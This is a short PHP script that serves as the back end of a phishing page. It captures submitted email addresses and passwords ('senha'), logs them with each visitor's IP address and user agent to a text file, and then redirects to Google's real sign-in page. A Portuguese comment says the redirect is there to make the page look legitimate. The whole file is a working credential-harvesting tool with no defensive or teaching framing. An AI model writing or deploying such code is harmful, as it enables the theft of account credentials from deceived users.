<?php
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $email = $_POST["email"] ?? "N/A";
    $senha = $_POST["senha"] ?? "N/A";

    $ip = $_SERVER['REMOTE_ADDR'];
    $userAgent = $_SERVER['HTTP_USER_AGENT'];

    $dados = "Email: $email | Senha: $senha | IP: $ip | User-Agent: $userAgent\n";

    file_put_contents("logs.txt", $dados, FILE_APPEND);

    // Redireciona para Google real (para parecer legítimo)
    header("Location: https://accounts.google.com/");
    exit();
}
?>
